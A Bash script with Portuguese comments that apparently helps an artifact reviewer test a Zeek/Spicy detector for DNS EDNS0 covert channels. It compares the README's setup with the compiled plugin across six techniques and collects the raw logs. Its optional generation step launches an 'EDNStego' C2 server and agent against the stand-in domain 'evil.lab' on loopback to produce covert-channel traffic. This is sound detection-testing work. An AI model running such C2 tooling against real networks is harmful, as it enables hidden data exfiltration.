#!/usr/bin/env bash
#
# run-edns0-tests.sh
#
# Executa o artefato "edns0-arbitrary" em duas configurações por técnica e
# coleta as saídas brutas para inspeção:
#
#   (A) README  — carrega apenas plugin-spicy/edns0-options.zeek (modo BIF).
#                 É o que as instruções publicadas mandam fazer.
#   (B) PLUGIN  — carrega o analisador Spicy compilado (.hlto) + o script
#                 do plugin + as regras. É o que o ARTIGO descreve.
#
# O contraste entre (A) e (B) é o dado que interessa: se (A) não emite
# notice mas (B) emite, a falha está nas instruções, não no artefato.
#
# Este script NÃO redige parecer nem decide selo. Ele apenas roda o
# artefato e organiza as saídas. A leitura e a avaliação são suas.
#
# Pré-requisitos:
#   - ambiente já preparado (Zeek com Spicy, venv, .hlto compilado)
#   - PCAPs já gerados pelo EDNStego, um por técnica
#
# Uso:
#   ./run-edns0-tests.sh                      # usa PCAPs em ./pcaps/tN.pcap
#   ./run-edns0-tests.sh --pcap-dir /tmp      # procura /tmp/tN.pcap
#   ./run-edns0-tests.sh --only t1            # roda só uma técnica
#   ./run-edns0-tests.sh --gen                # gera os PCAPs antes (T1..T6)
#
set -uo pipefail

# ---------------------------------------------------------------------------
REPO_DIR="${REPO_DIR:-$HOME/edns0-arbitrary}"
PCAP_DIR="${PCAP_DIR:-$REPO_DIR/pcaps}"
OUT_ROOT="$REPO_DIR/out"
VENV="$REPO_DIR/.venv"

PLUGIN_DIR="$REPO_DIR/plugin-spicy"
RULES_DIR="$REPO_DIR/regras/zeek"

HLTO="$PLUGIN_DIR/edns0_arbitrary.hlto"
PLUGIN_ZEEK="$PLUGIN_DIR/edns0_arbitrary.zeek"
BIF_ZEEK="$PLUGIN_DIR/edns0-options.zeek"
DETECT_ZEEK="$RULES_DIR/edns0-detection.zeek"

TECHNIQUES=(t1 t2 t3 t4 t5 t6)
ONLY=""
DO_GEN=0

RESOLVER="127.0.0.1"
SERVER_DOMAIN="evil.lab"
DURATION=20

for ((i=1;i<=$#;i++)); do
  case "${!i}" in
    --pcap-dir) j=$((i+1)); PCAP_DIR="${!j}" ;;
    --only)     j=$((i+1)); ONLY="${!j}" ;;
    --gen)      DO_GEN=1 ;;
    -h|--help)  sed -n '3,30p' "$0"; exit 0 ;;
  esac
done
[ -n "$ONLY" ] && TECHNIQUES=("$ONLY")

say()  { printf '\n\033[1;34m==> %s\033[0m\n' "$*"; }
ok()   { printf '\033[1;32m  [OK]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m  [!]\033[0m %s\n' "$*"; }
err()  { printf '\033[1;31m  [X]\033[0m %s\n' "$*"; }
SUDO=""; [ "$(id -u)" -ne 0 ] && SUDO="sudo"

# ---------------------------------------------------------------------------
# Checagens de pré-requisitos
# ---------------------------------------------------------------------------
preflight() {
  say "Checando pré-requisitos"
  local falhou=0

  command -v zeek >/dev/null 2>&1 || { err "zeek não está no PATH"; falhou=1; }

  if zeek -N 2>/dev/null | grep -qi 'Zeek::Spicy'; then
    ok "Zeek::Spicy disponível"
  else
    err "Zeek::Spicy ausente — plugin não carregará"; falhou=1
  fi

  for f in "$BIF_ZEEK" "$DETECT_ZEEK"; do
    [ -f "$f" ] || { err "arquivo esperado ausente: $f"; falhou=1; }
  done

  if [ -f "$HLTO" ]; then
    ok "Analisador compilado presente: $(basename "$HLTO")"
  else
    warn "$(basename "$HLTO") ausente — a versão PLUGIN vai falhar."
    warn "Compile com: cd $PLUGIN_DIR && spicyz -o edns0_arbitrary.hlto *.spicy *.evt"
  fi

  [ "$falhou" -eq 0 ] || { err "Pré-requisitos não atendidos."; exit 1; }
}

# ---------------------------------------------------------------------------
# Geração opcional dos PCAPs (T1..T6) via EDNStego
# ---------------------------------------------------------------------------
generate_pcaps() {
  say "Gerando PCAPs com EDNStego (server na porta 53)"
  warn "Requer sudo (scapy usa raw sockets) e ocupa a porta 53 do loopback."
  mkdir -p "$PCAP_DIR"

  # autentica o sudo antes dos jobs em background, senão eles travam
  $SUDO -v

  say "Subindo o server C2 em background"
  $SUDO "$VENV/bin/python" -m ednstego.server \
    --listen 127.0.0.1 --port 53 --domain "$SERVER_DOMAIN" \
    >"$OUT_ROOT/server.log" 2>&1 &
  local server_pid=$!
  sleep 2

  for t in "${TECHNIQUES[@]}"; do
    local pcap="$PCAP_DIR/$t.pcap"
    say "Capturando $t -> $pcap"
    $SUDO rm -f "$pcap"
    $SUDO tcpdump -i lo -w "$pcap" udp port 53 >/dev/null 2>&1 &
    local td_pid=$!
    sleep 1
    $SUDO "$VENV/bin/python" -m ednstego.agent \
      --server "$SERVER_DOMAIN" --resolver "$RESOLVER" \
      --mode "$t" --duration "$DURATION" 2>&1 | sed 's/^/    /'
    $SUDO kill "$td_pid" 2>/dev/null
    sleep 1
    $SUDO chown "$USER":"$USER" "$pcap" 2>/dev/null
    local n; n=$($SUDO tcpdump -r "$pcap" 2>/dev/null | wc -l)
    if [ "$n" -gt 0 ]; then ok "$t: $n pacotes"; else warn "$t: 0 pacotes"; fi
  done

  $SUDO kill "$server_pid" 2>/dev/null
  ok "Geração concluída. Reinicie o DNS da VM se precisar navegar: sudo systemctl restart systemd-resolved"
}

# ---------------------------------------------------------------------------
# Execução de uma versão (README ou PLUGIN) para uma técnica
# ---------------------------------------------------------------------------
run_variant() {
  local tech="$1" variant="$2" pcap="$3"
  local dir="$OUT_ROOT/$tech-$variant"
  rm -rf "$dir"; mkdir -p "$dir"
  ( cd "$dir" || return 1
    if [ "$variant" = "readme" ]; then
      zeek -C -r "$pcap" "$BIF_ZEEK" "$DETECT_ZEEK" >zeek.stderr 2>&1
    else
      zeek -C -r "$pcap" "$HLTO" "$PLUGIN_ZEEK" "$DETECT_ZEEK" >zeek.stderr 2>&1
    fi
  )
  echo "$dir"
}

# ---------------------------------------------------------------------------
# Sumário de uma execução
# ---------------------------------------------------------------------------
summarize() {
  local dir="$1" label="$2"
  local notices=0 h1a=0
  if [ -f "$dir/notice.log" ]; then
    notices=$(grep -vc '^#' "$dir/notice.log" 2>/dev/null || echo 0)
    h1a=$(grep -c 'H1a' "$dir/notice.log" 2>/dev/null || echo 0)
  fi
  local warns; warns=$(grep -c 'non-existing event' "$dir/zeek.stderr" 2>/dev/null || echo 0)

  printf '    %-8s notices=%-3s H1a=%-3s warn_evento_inexistente=%s\n' \
    "$label" "$notices" "$h1a" "$warns"

  # anexa ao relatório consolidado
  {
    echo "===================================================================="
    echo "### $dir"
    echo "--- zeek.stderr (warnings/erros) ---"
    cat "$dir/zeek.stderr" 2>/dev/null || echo "(vazio)"
    echo "--- notice.log ---"
    cat "$dir/notice.log" 2>/dev/null || echo "(sem notice.log)"
    echo "--- edns0_opts.log (só na versão README) ---"
    cat "$dir/edns0_opts.log" 2>/dev/null || echo "(sem edns0_opts.log)"
    echo "--- logs gerados ---"
    ls -1 "$dir"/*.log 2>/dev/null || echo "(nenhum .log)"
    echo
  } >>"$REPORT"
}

# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
main() {
  mkdir -p "$OUT_ROOT"
  REPORT="$OUT_ROOT/RELATORIO-execucao.txt"
  : >"$REPORT"
  {
    echo "Relatório de execução — edns0-arbitrary"
    echo "Data: $(date -Is)"
    echo "Host: $(uname -a)"
    echo "Zeek: $(zeek --version 2>/dev/null | head -n1)"
    echo "PCAP dir: $PCAP_DIR"
    echo
  } >>"$REPORT"

  preflight
  [ "$DO_GEN" -eq 1 ] && generate_pcaps

  say "Executando técnicas: ${TECHNIQUES[*]}"
  for t in "${TECHNIQUES[@]}"; do
    local pcap="$PCAP_DIR/$t.pcap"
    if [ ! -f "$pcap" ]; then
      warn "$t: PCAP ausente ($pcap) — pulando. Gere com --gen ou aponte --pcap-dir."
      continue
    fi
    say "Técnica $t"
    local dr dp
    dr=$(run_variant "$t" readme "$pcap")
    dp=$(run_variant "$t" plugin "$pcap")
    summarize "$dr" "README"
    summarize "$dp" "PLUGIN"
  done

  say "Concluído"
  echo "  Relatório consolidado: $REPORT"
  echo "  Pastas por execução:   $OUT_ROOT/<tN>-{readme,plugin}/"
  echo
  echo "  Leia o relatório e compare, por técnica, a linha README com a PLUGIN."
  echo "  O material bruto de cada pasta é o que vai para o campo de prova de"
  echo "  execução do formulário — a leitura e a decisão de selo são suas."
}

main "$@"
